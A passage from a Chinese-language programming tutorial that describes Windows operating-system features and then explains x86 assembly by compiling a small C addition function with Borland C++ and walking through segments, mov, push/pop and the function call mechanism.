<li>通过 WYSIWYG 实现打印输出，WYSIWYG 其实就是 What You See Is What You Get ，值得是显示器上显示的图形和文本都是可以原样输出到打印机打印的。</li>
<li>提供多任务功能，即能够同时开启多个任务</li>
<li>提供网络功能和数据库功能</li>
<li>通过即插即用实现设备驱动的自设定</li>
</ul>
<p>这些是对程序员来讲比较有意义的一些特征，下面针对这些特征来进行分别的介绍：</p>
<h3 id="32-位操作系统"><a href="#32-位操作系统" class="headerlink" title="32 位操作系统"></a>32 位操作系统</h3><p>这里表示的 32 位操作系统表示的是<strong>处理效率最高的数据大小</strong>。Windows 处理数据的基本单位是 32 位。这与最一开始在 MS-DOS 等 16 位操作系统不同，因为在 16 位操作系统中处理 32 位数据需要两次，而 32 位操作系统只需要一次就能够处理 32 位的数据，所以一般在 windows 上的应用，它们的最高能够处理的数据都是 32 位的。<br>比如，用 C 语言来处理整数数据时，有 8 位的 char 类型，16 位的 short 类型，以及 32 位的 long 类型三个选项，使用位数较大的 long 类型进行处理的话，增加的只是内存以及磁盘的开销，对性能影响不大。<br>现在市面上大部分都是 64 位操作系统了，64 位操作系统也是如此。</p>
<h3 id="通过-API-函数集来提供系统调用"><a href="#通过-API-函数集来提供系统调用" class="headerlink" title="通过 API 函数集来提供系统调用"></a>通过 API 函数集来提供系统调用</h3><p>Windows 是通过名为 API 的函数集来提供系统调用的。API是联系应用程序和操作系统之间的接口，全称叫做 Application Programming Interface，应用程序接口。<br>当前主流的 32 位版 Windows API 也称为 Win32 API，之所以这样命名，是需要和不同的操作系统进行区分，比如最一开始的 16 位版的 Win16 API，和后来流行的 Win64 API 。<br>API 通过多个 DLL 文件来提供，各个 API 的实体都是用 C 语言编写的函数。所以，在 C 语言环境下，使用 API 更加容易，比如 API 所用到的<code>MessageBox()</code>函数，就被保存在了 Windows 提供的 user32.dll 这个 DLL 文件中。</p>
<h3 id="提供采用了-GUI-的用户界面"><a href="#提供采用了-GUI-的用户界面" class="headerlink" title="提供采用了 GUI 的用户界面"></a>提供采用了 GUI 的用户界面</h3><p>GUI（Graphical User Interface）指得就是图形用户界面，通过点击显示器中的窗口以及图标等可视化的用户界面，举个例子：Linux 操作系统就有两个版本，一种是简洁版，直接通过命令行控制硬件，还有一种是可视化版，通过光标点击图形界面来控制硬件。</p>
<h3 id="通过-WYSIWYG-实现打印输出"><a href="#通过-WYSIWYG-实现打印输出" class="headerlink" title="通过 WYSIWYG 实现打印输出"></a>通过 WYSIWYG 实现打印输出</h3><p>WYSIWYG 指的是显示器上输出的内容可以直接通过打印机打印输出。在 Windows 中，显示器和打印机被认作同等的图形输出设备处理的，该功能也为 WYSIWYG 提供了条件。<br>借助 WYSIWYG 功能，程序员可以轻松不少。最初，为了是现在显示器中显示和在打印机中打印，就必须分别编写各自的程序，而在 Windows 中，可以借助 WYSIWYG 基本上在一个程序中就可以做到显示和打印这两个功能了。</p>
<h3 id="提供多任务功能"><a href="#提供多任务功能" class="headerlink" title="提供多任务功能"></a>提供多任务功能</h3><p>多任务指的就是同时能够运行多个应用程序的功能，Windows 是通过<strong>时钟分割</strong>技术来实现多任务功能的。时钟分割指的是短时间间隔内，多个程序切换运行的方式。在用户看来，就好像是多个程序在同时运行，其底层是 CPU 时间切片，这也是多线程多任务的核心。</p>
<figure class="image-box">
                <img src="36.png" alt title class>
                <p></p>
            </figure>

<h3 id="提供网络功能和数据库功能"><a href="#提供网络功能和数据库功能" class="headerlink" title="提供网络功能和数据库功能"></a>提供网络功能和数据库功能</h3><p>Windows 中，网络功能是作为标准功能提供的。数据库（数据库服务器）功能有时也会在后面追加。网络功能和数据库功能虽然并不是操作系统不可或缺的，但因为它们和操作系统很接近，所以被统称为<strong>中间件</strong>而不是应用。意思是处于操作系统和应用的中间层，操作系统和中间件组合在一起，称为<strong>系统软件</strong>。应用不仅可以利用操作系统，也可以利用中间件的功能。</p>
<figure class="image-box">
                <img src="37.png" alt title class>
                <p></p>
            </figure>

<p>相对于操作系统一旦安装就不能轻易更换，中间件可以根据需要进行更换，不过，对于大部分应用来说，更换中间件的话，会造成应用也随之更换，从这个角度来说，更å换中间件也不是那么容易。</p>
<h3 id="通过即插即用实现设备驱动的自动设定"><a href="#通过即插即用实现设备驱动的自动设定" class="headerlink" title="通过即插即用实现设备驱动的自动设定"></a>通过即插即用实现设备驱动的自动设定</h3><p>即插即用（Plug-and-Play）指的是新的设备连接（plug）后就可以直接使用的机制，新设备连接计算机后，计算机就会自动安装和设定用来控制该设备的<strong>驱动程序</strong>。<br>设备驱动是操作系统的一部分，提供了同硬件进行基本的输入输出的功能。键盘、鼠标、显示器、磁盘装置等，这些计算机中必备的硬件的设备驱动，一般都是随操作系统一起安装的。<br>有时 DLL 文件也会同设备驱动文件一起安装。这些 DLL 文件中存储着用来利用该新追加的硬件 API，通过 API，可以制作出运行该硬件的心应用。</p>
<hr>
<h1 id="汇编语言和本地代码"><a href="#汇编语言和本地代码" class="headerlink" title="汇编语言和本地代码"></a>汇编语言和本地代码</h1><p>我们在之前的文章中探讨过，计算机 CPU 只能运行本地代码（机器语言）程序，用 C 语言等高级语言编写的代码，需要经过编译器编译后，转换为本地代码才能够被 CPU 解释执行。<br>但是本地代码的可读性非常差，所以需要使用一种能够直接读懂的语言来替换本地代码，那就是在各本地代码中，附带上表示其功能的英文缩写，比如在加法运算的本地代码加上 add（addition）的缩写、在比较运算符的本地代码中加上 cmp（compare）的缩写等，这些通过缩写来表示具体本地代码指令的标志称为<strong>助记符</strong>，使用助记符的语言称为<strong>汇编语言</strong>。这样，通过阅读汇编语言，也能够了解本地代码的含义了。<br>不过，即使是使用汇编语言编写的源代码，最终也必须要转换为本地代码才能够运行，负责做这项工作的程序称为<strong>编译器</strong>，转换的这个过程称为<strong>汇编</strong>。在将源代码转换为本地代码这个功能方面，汇编器和编译器是同样的。<br>用汇编语言编写的源代码和本地代码是一一对应的。因而，本地代码也可以反过来转换成汇编语言编写的代码。把本地代码转换为汇编代码的这一过程称为<strong>反汇编</strong>，执行反汇编的程序称为反汇编程序。</p>
<figure class="image-box">
                <img src="38.png" alt title class>
                <p></p>
            </figure>

<p>哪怕是 C 语言编写的源代码，编译后也会转换成特定 CPU 用的本地代码。而将其反汇编的话，就可以得到汇编语言的源代码，并对其内容进行调查。不过，<strong>本地代码变成 C 语言源代码的反编译，要比本地代码转换成汇编代码的反汇编要困难</strong>，这是因为，C 语言代码和本地代码不是一一对应的关系。</p>
<h2 id="通过编译器输出汇编语言的源代码"><a href="#通过编译器输出汇编语言的源代码" class="headerlink" title="通过编译器输出汇编语言的源代码"></a>通过编译器输出汇编语言的源代码</h2><p>我们上面提到本地代码可以经过反汇编转换成为汇编代码，但是只有这一种转换方式吗？显然不是，C 语言编写的源代码也能够通过编译器编译称为汇编代码，下面就来尝试一下。</p>
<p>首先需要先做一些准备，需要先下载 Borland C++ 5.5 编译器，为了方便，我这边直接下载好了读者直接从我的百度网盘提取即可。（链接：<a href="https://pan.baidu.com/s/19LqVICpn5GcV88thD2AnlA" target="_blank" rel="noopener">https://pan.baidu.com/s/19LqVICpn5GcV88thD2AnlA</a> 密码：hz1u）<br>下载完毕，需要进行配置。下面是配置说明：<a href="https://wenku.baidu.com/view/22e2f418650e52ea551898ad.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/22e2f418650e52ea551898ad.html</a> ，教程很完整跟着配置就可以。下面开始我们的编译过程。<br>首先用 Windows 记事本等文本编辑器编写如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回两个参数值之和的函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AddNum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 AddNum 函数的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  c = AddNum(<span class="number">123</span>,<span class="number">456</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写完成后将其文件名保存为 Sample4.c ，C 语言源文件的扩展名，通常用<code>.c</code>来表示，上面程序是提供两个输入参数并返回它们之和。<br>在 Windows 操作系统下打开命令提示符，切换到保存 Sample4.c 的文件夹下，然后在命令提示符中输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcc32 -c -S Sample4.c</span><br></pre></td></tr></table></figure>

<p>bcc32 是启动 Borland C++ 的命令，<code>-c</code>的选项是指仅进行编译而不进行链接，<code>-S</code>选项被用来指定生成汇编语言的源代码。<br>作为编译的结果，当前目录下会生成一个名为 Sample4.asm 的汇编语言源代码。汇编语言源文件的扩展名，通常用<code>.asm</code>来表示，下面就让我们用编辑器打开看一下 Sample4.asm 中的内容：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">    .386p</span></span><br><span class="line">    ifdef ??version</span><br><span class="line">    if    ??version GT <span class="number">500H</span></span><br><span class="line"><span class="meta">    .mmx</span></span><br><span class="line">    endif</span><br><span class="line">    endif</span><br><span class="line">    model flat</span><br><span class="line">    ifndef  ??version</span><br><span class="line">    ?debug  macro</span><br><span class="line">    endm</span><br><span class="line">    endif</span><br><span class="line">    ?debug  S <span class="string">"Sample4.c"</span></span><br><span class="line">    ?debug  T <span class="string">"Sample4.c"</span></span><br><span class="line">_TEXT   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_TEXT   ends</span><br><span class="line">_DATA   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'DATA'</span></span><br><span class="line">_DATA   ends</span><br><span class="line">_BSS    <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'BSS'</span></span><br><span class="line">_BSS    ends</span><br><span class="line">DGROUP  group   _BSS,_DATA</span><br><span class="line">_TEXT   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_AddNum proc    <span class="built_in">near</span></span><br><span class="line"><span class="symbol">?live1@0:</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;    int AddNum(int a,int b)&#123;</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">    <span class="keyword">push</span>      <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span>       <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;        return a + b;</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">@<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">add</span>       <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">12</span>]</span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;    &#125;</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">@<span class="number">3</span>:</span><br><span class="line">@<span class="number">2</span>:</span><br><span class="line">    <span class="keyword">pop</span>       <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> </span><br><span class="line">_AddNum endp</span><br><span class="line">_MyFunc proc    <span class="built_in">near</span></span><br><span class="line"><span class="symbol">?live1@48:</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;    void MyFunc()&#123;</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">    <span class="keyword">push</span>      <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span>       <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;        int c;</span></span><br><span class="line">   <span class="comment">;        c = AddNum(123,456);</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">@<span class="number">4</span>:</span><br><span class="line">    <span class="keyword">push</span>      <span class="number">456</span></span><br><span class="line">    <span class="keyword">push</span>      <span class="number">123</span></span><br><span class="line">    <span class="keyword">call</span>      _AddNum</span><br><span class="line">    <span class="keyword">add</span>       <span class="built_in">esp</span>,<span class="number">8</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">   <span class="comment">;    &#125;</span></span><br><span class="line">   <span class="comment">;    </span></span><br><span class="line">@<span class="number">5</span>:</span><br><span class="line">    <span class="keyword">pop</span>       <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> </span><br><span class="line">_MyFunc endp</span><br><span class="line">_TEXT   ends</span><br><span class="line">    <span class="meta">public</span>  _AddNum</span><br><span class="line">    <span class="meta">public</span>  _MyFunc</span><br><span class="line">    ?debug  D <span class="string">"Sample4.c"</span> <span class="number">20343</span> <span class="number">45835</span></span><br><span class="line">    end</span><br></pre></td></tr></table></figure>

<p>这样，编译器就成功的把 C 语言转换成为了汇编代码了。</p>
<h2 id="不会转换成本地代码的伪指令"><a href="#不会转换成本地代码的伪指令" class="headerlink" title="不会转换成本地代码的伪指令"></a>不会转换成本地代码的伪指令</h2><p>第一次看到汇编代码的读者可能感觉起来比较难，不过实际上其实比较简单，而且可能比 C 语言还要简单，为了便于阅读汇编代码的源代码，需要注意几个要点。<br>汇编语言的源代码，是由转换成本地代码的指令（后面讲述的操作码）和针对汇编器的伪指令构成的。伪指令负责把程序的构造以及汇编的方法指示给汇编器（转换程序）。不过伪指令是无法汇编转换成为本地代码的。下面是上面程序截取的伪指令：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_TEXT   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_TEXT   ends</span><br><span class="line">_DATA   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'DATA'</span></span><br><span class="line">_DATA   ends</span><br><span class="line">_BSS    <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'BSS'</span></span><br><span class="line">_BSS    ends</span><br><span class="line">DGROUP  group   _BSS,_DATA</span><br><span class="line"></span><br><span class="line">_AddNum proc    <span class="built_in">near</span></span><br><span class="line">_AddNum endp</span><br><span class="line"></span><br><span class="line">_MyFunc proc    <span class="built_in">near</span></span><br><span class="line">_MyFunc endp</span><br><span class="line"></span><br><span class="line">_TEXT   ends</span><br><span class="line">    end</span><br></pre></td></tr></table></figure>

<p>由伪指令 segment 和 ends 围起来的部分，是给构成程序的命令和数据的集合体上加一个名字而得到的，称为段定义。段定义的英文表达具有区域的意思，在这个程序中，段定义指的是命令和数据等程序的集合体的意思，一个程序由多个段定义构成。</p>
<p>上面代码的开始位置，定义了 3 个名称分别为 _TEXT、_DATA、_BSS 的段定义，_TEXT 是指定的段定义，_DATA 是被初始化（有初始值）的数据的段定义，_BSS 是尚未初始化的数据的段定义。这种定义的名称是由 Borland C++ 定义的，是由 Borland C++ 编译器自动分配的，所以程序段定义的顺序就成为了 _TEXT、_DATA、_BSS，这样也确保了内存的连续性。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_TEXT   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_TEXT   ends</span><br><span class="line">_DATA   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'DATA'</span></span><br><span class="line">_DATA   ends</span><br><span class="line">_BSS    <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'BSS'</span></span><br><span class="line">_BSS    ends</span><br></pre></td></tr></table></figure>

<blockquote>
<p>段定义（segment）是用来区分或者划分范围区域的意思。汇编语言的 segment 伪指令表示段定义的起始，ends 伪指令表示段定义的结束。段定义是一段连续的内存空间。</p>
</blockquote>
<p>而 group 这个伪指令表示的是将 _BSS 和 _DATA 这两个段定义汇总名为 DGROUP 的组。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DGROUP  group   _BSS,_DATA</span><br></pre></td></tr></table></figure>

<p>围起 _AddNum 和 _MyFun 的 _TEXT segment 和 _TEXT ends，表示 _AddNum 和 _MyFun 是属于 _TEXT 这一段定义的。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_TEXT   <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_TEXT   ends</span><br></pre></td></tr></table></figure>

<p>因此，即使在源代码中指令和数据是混杂编写的，经过编译和汇编后，也会转换成为规整的本地代码。</p>
<p><code>_AddNum proc</code>和<code>_AddNum endp</code>围起来的部分，以及<code>_MyFunc proc</code>和<code>_MyFunc endp</code>围起来的部分，分别表示 AddNum 函数和 MyFunc 函数的范围。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_AddNum proc    <span class="built_in">near</span></span><br><span class="line">_AddNum endp</span><br><span class="line"></span><br><span class="line">_MyFunc proc    <span class="built_in">near</span></span><br><span class="line">_MyFunc endp</span><br></pre></td></tr></table></figure>

<p>编译后在函数名前附带上下划线<code>_</code>，是 Borland C++ 的规定。在 C 语言中编写的 AddNum 函数，在内部是以<code>_AddNum</code>这个名称处理的。伪指令<code>proc</code>和<code>endp</code>围起来的部分，表示的是过程（procedure）的范围。在汇编语言中，这种相当于 C 语言的函数的形式称为过程。<br>末尾的 end 伪指令，表示的是源代码的结束。</p>
<h2 id="汇编语言的语法是-操作码-操作数"><a href="#汇编语言的语法是-操作码-操作数" class="headerlink" title="汇编语言的语法是 操作码 + 操作数"></a>汇编语言的语法是 操作码 + 操作数</h2><p>在汇编语言中，一行表示一对 CPU 的一个指令。汇编语言指令的语法结构是 <strong>操作码 + 操作数</strong>，也存在只有操作码没有操作数的指令。<br>操作码表示的是指令动作，操作数表示的是指令对象。操作码和操作数一起使用就是一个英文指令。比如从英语语法来分析的话，操作码是动词，操作数是宾语。比如这个句子 Give me money 这个英文指令的话，Give 就是操作码，me 和 money 就是操作数。汇编语言中存在多个操作数的情况，要用逗号把它们分割，就像是 Give me,money 这样。</p>
<p>能够使用何种形式的操作码，是由 CPU 的种类决定的，下面对操作码的功能进行了整理：</p>
<figure class="image-box">
                <img src="39.png" alt title class>
                <p></p>
            </figure>

<p>本地代码需要加载到内存后才能运行，内存中存储着构成本地代码的指令和数据。程序运行时，CPU 会从内存中把数据和指令读出来，然后放在 CPU 内部的寄存器中进行处理。</p>
<figure class="image-box">
                <img src="40.png" alt title class>
                <p></p>
            </figure>

<p>如果 CPU 和内存的关系你还不是很了解的话，请阅读作者的另一篇文章 <a href="https://mp.weixin.qq.com/s?__biz=MzU2NDg0OTgyMA==&mid=2247484585&idx=1&sn=0d6c3ccf8cc5bec2fea80eb437213801&chksm=fc45f95acb32704c7dcc952a803e88e8a9b0e67c86d8c27abf4e6c776e48b1fcd770dd2dcc8d&token=653889808&lang=zh_CN#rd" target="_blank" rel="noopener">程序员需要了解的硬核知识之CPU</a> 详细了解。</p>
<p>寄存器是 CPU 中的存储区域，寄存器除了具有临时存储和计算的功能之外，还具有运算功能，x86 系列的主要种类和角色如下图所示：</p>
<figure class="image-box">
                <img src="41.png" alt title class>
                <p></p>
            </figure>

<h3 id="指令解析"><a href="#指令解析" class="headerlink" title="指令解析"></a>指令解析</h3><p>下面就对 CPU 中的指令进行分析。</p>
<h4 id="最常用的-mov-指令"><a href="#最常用的-mov-指令" class="headerlink" title="最常用的 mov 指令"></a>最常用的 mov 指令</h4><p>指令中最常使用的是对寄存器和内存进行数据存储的 mov 指令，mov 指令的两个操作数，分别用来指定数据的存储地和读出源。操作数中可以指定寄存器、常数、标签（附加在地址前），以及用方括号（<code>[]</code>）围起来的这些内容。如果指定了没有用（<code>[]</code>）方括号围起来的内容，就表示对该值进行处理；如果指定了用方括号围起来的内容，方括号的值则会被解释为内存地址，然后就会对该内存地址对应的值进行读写操作。让我们对上面的代码片段进行说明。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>       <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p><code>mov ebp,esp</code>中，esp 寄存器中的值被直接存储在了 ebp 中，也就是说，如果 esp 寄存器的值是 100 的话那么 ebp 寄存器的值也是 100。<br>而在<code>mov eax,dword ptr [ebp+8]</code>这条指令中，ebp 寄存器的值 + 8 后会被解析称为内存地址。如果 ebp 寄存器的值是 100 的话，那么 eax 寄存器的值就是 100 + 8 的地址的值。dword ptr 也叫做 double word pointer 简单解释一下就是从指定的内存地址中读出 4 字节的数据。</p>
<h4 id="对栈进行-push-和-pop"><a href="#对栈进行-push-和-pop" class="headerlink" title="对栈进行 push 和 pop"></a>对栈进行 push 和 pop</h4><p>程序运行时，会在内存上申请分配一个称为栈的数据空间。栈（stack）的特性是后入先出，数据在存储时是从内存的下层（大的地址编号）逐渐往上层（小的地址编号）累积，读出时则是按照从上往下进行读取的。</p>
<figure class="image-box">
                <img src="42.png" alt title class>
                <p></p>
            </figure>

<p>栈是存储临时数据的区域，它的特点是通过 push 指令和 pop 指令进行数据的存储和读出。向栈中存储数据称为<strong>入栈</strong>，从栈中读出数据称为<strong>出栈</strong>，32 位 x86 系列的 CPU 中，进行 1 次 push 或者 pop，即可处理 32 位（4 字节）的数据。</p>
<h2 id="函数的调用机制"><a href="#函数的调用机制" class="headerlink" title="函数的调用机制"></a>函数的调用机制</h2><p>下面我们一起来分析一下函数的调用机制，我们以上面的 C 语言编写的代码为例。首先，让我们从 MyFunc 函数调用 AddNum 函数的汇编语言部分开始，来对函数的调用机制进行说明。栈在函数的调用中发挥了巨大的作用，下面是经过处理后的 MyFunc 函数的汇编处理内容：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_MyFunc      proc    <span class="built_in">near</span></span><br><span class="line">    <span class="keyword">push</span>            <span class="built_in">ebp</span>       <span class="comment">; 将 ebp 寄存器的值存入栈中            (1) </span></span><br><span class="line">    <span class="keyword">mov</span>             <span class="built_in">ebp</span>,<span class="built_in">esp</span>   <span class="comment">; 将 esp 寄存器的值存入 ebp 寄存器中    (2)</span></span><br><span class="line">    <span class="keyword">push</span>            <span class="number">456</span>       <span class="comment">; 将 456 入栈                         (3)</span></span><br><span class="line">    <span class="keyword">push</span>            <span class="number">123</span>       <span class="comment">; 将 123 入栈                         (4)</span></span><br><span class="line">    <span class="keyword">call</span>            _AddNum   <span class="comment">; 调用 AddNum 函数                    (5)</span></span><br><span class="line">    <span class="keyword">add</span>             <span class="built_in">esp</span>,<span class="number">8</span>     <span class="comment">; esp 寄存器的值 + 8                   (6)</span></span><br><span class="line">    <span class="keyword">pop</span>             <span class="built_in">ebp</span>       <span class="comment">; 读出栈中的数值存入 esp 寄存器中       (7)</span></span><br><span class="line">    <span class="keyword">ret</span>                       <span class="comment">; 结束 MyFunc 函数，返回到调用源        (8)</span></span><br><span class="line">_MyFunc         endp</span><br></pre></td></tr></table></figure>

<p>代码解释中的 (1)、(2)、(7)、(8) 的处理适用于 C 语言中的所有函数，我们会在后面展示 AddNum 函数处理内容时进行说明。这里希望大家先关注 (3) - (6) 这一部分，这对了解函数调用机制至关重要。<br>(3) 和 (4) 表示的是将传递给 AddNum 函数的参数通过 push 入栈。在 C 语言源代码中，虽然记述为函数<code>AddNum(123,456)</code>，但入栈时则会先按照 456，123 这样的顺序。也就是位于后面的数值先入栈。这是 C 语言的规定。(5) 表示的 call 指令，会把程序流程跳转到 AddNum 函数指令的地址处。在汇编语言中，函数名表示的就是函数所在的内存地址。AddNum 函数处理完毕后，程序流程必须要返回到编号 (6) 这一行。call 指令运行后，call 指令的下一行（也就指的是 (6) 这一行）的内存地址（调用函数完毕后要返回的内存地址）会自动的 push 入栈。该值会在 AddNum 函数处理的最后通过 ret 指令 pop 出栈，然后程序会返回到 (6) 这一行。<br>(6) 部分会把栈中存储的两个参数（456 和 123）进行销毁处理。虽然通过两次的 pop 指令也可以实现，不过采用 esp 寄存器 + 8 的方式会更有效率（处理 1 次即可）。对栈进行数值的输入和输出时，数值的单位是 4 字节。因此，通过在负责栈地址管理的 esp 寄存器中加上 4 的 2 倍 8，就可以达到和运行两次 pop 命令同样的效果。虽然内存中的数据实际上还残留着，但只要把 esp 寄存器的值更新为数据存储地址前面的数据位置，该数据也就相当于销毁了。</p>
<p>我在编译 Sample4.c 文件时，出现了下图的这条消息：</p>
<figure class="image-box">
                <img src="43.png" alt title class>
                <p></p>
            </figure>

<p>图中的意思是指 c 的值在 MyFunc 定义了但是一直未被使用，这其实是一项编译器优化的功能，由于存储着 AddNum 函数返回值的变量 c 在后面没有被用到，因此编译器就认为<strong>该变量没有意义</strong>，进而也就<strong>没有生成与之对应的汇编语言代码</strong>。</p>
<p>下图是调用 AddNum 这一函数前后栈内存的变化：</p>
<figure class="image-box">
                <img src="44.png" alt title class>
                <p></p>
            </figure>

<h2 id="函数的内部处理"><a href="#函数的内部处理" class="headerlink" title="函数的内部处理"></a>函数的内部处理</h2><p>上面我们用汇编代码分析了一下 Sample4.c 整个过程的代码，现在我们着重分析一下 AddNum 函数的源代码部分，分析一下参数的接收、返回值和返回等机制。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_AddNum         proc        <span class="built_in">near</span></span><br><span class="line">    <span class="keyword">push</span>            <span class="built_in">ebp</span>                    -----------(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">mov</span>             <span class="built_in">ebp</span>,<span class="built_in">esp</span>                -----------(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">mov</span>             <span class="built_in">eax</span>,<span class="built_in">dword</span> <span 